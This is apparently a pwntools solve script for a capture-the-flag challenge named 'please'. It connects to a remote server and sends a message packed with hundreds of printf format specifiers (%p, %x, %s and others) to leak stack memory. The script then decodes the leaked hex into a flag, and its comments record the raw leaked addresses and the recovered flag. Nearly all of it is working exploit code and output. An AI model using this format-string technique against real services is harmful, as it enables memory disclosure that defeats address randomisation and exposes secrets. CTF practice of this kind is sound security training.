from pwn import *


def instant_leak(i, mode="x"):
    payload = "please  " + f"%{mode} "*i
    #io = process("./please")#
    io = remote('mc.ax', 31569)
    print(io.recv())
    io.sendline(payload)
    try:
        data = io.recv().decode()
        print(data)
    except:
        data = ""
    return data.replace(" to you too!", "").replace("please", "").split(" ")
    
def specificleak(i,mode='x'):
    client = remote('mc.ax', 31569)
    client.recv()
    client.sendline(f"%{i}${mode}")
    data = client.recv()
    print(data)
    client.close()
    return data
    
s = []
c = []
d = []
x=[]
p = []

'''
for i in range(1,100):
    print("###",i,"###############")
    try:
        p.append(instant_leak(i,'p'))
        x.append(instant_leak(i))
        s.append(instant_leak(i,'s'))
        c.append(instant_leak(i,'c'))
        d.append(instant_leak(i,'d'))
    except Exception as e:
        print(e)
'''
i = 20000

p = instant_leak(i,'p')
x = instant_leak(i)
s = instant_leak(i,'s')
c = instant_leak(i,'c')
d = instant_leak(i,'d')

def hexStringToString(hexString):
    hexString = hexString.replace("0x", "")
    while len(hexString) % 2 != 0:
        hexString = "0" + hexString
    return bytes.fromhex(hexString).decode('utf-8')[::-1]

#print(hexStringToString('41414141'))
xx = []
for i in p:
    try:
        xx.append(hexStringToString(i))#[2:]))
    except:
        xx.append(f"({i})")

print(x, c, s, d, p)
print(''.join(xx))

#p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %pflag{pl3as3_pr1ntf_w1th_caut10n_9a3xl}
#((nil))((nil))((nil))((nil))((nil))((nil))((nil))((nil))((nil))((nil))((nil))((nil))((nil))((nil))((nil))((nil))((nil))((nil))((nil))((nil))((nil))((nil))((nil))((nil))((nil))((nil))((nil))((nil))((nil))((nil))((nil))((nil))((nil))((nil))((nil))((nil))((nil))((nil))((nil))((nil))((nil))((nil))((nil))((nil))((nil))((nil))((nil))((nil))((nil))((nil))((nil))((nil))((nil))((nil))((nil))((nil))((nil))((nil))((nil))(0x55719dc773a0)(0xc89c56c276286900)(0x55719dc773a0)(0x55719dc772b0)(0x7ffe3ad7d000)(0x7fa76709309b)((nil))(0x7ffe3ad7d008)(0x55719dc77160)((nil))(0xfd68a3aa21a846b6)(0x55719dc772b0)(0x7ffe3ad7d000)((nil))((nil))(0xa877ed8b588846b6)(0xa8c55636a64e46b6)((nil))((nil))((nil))(0x7ffe3ad7d018)(0x7fa76725d190)(0x7fa767243476)((nil))((nil))(0x55719dc772b0)(0x7ffe3ad7d000)((nil))(0x55719dc772de)(0x7ffe3ad7cff8)(0x7ffe3ad7efe6)((nil)
#)
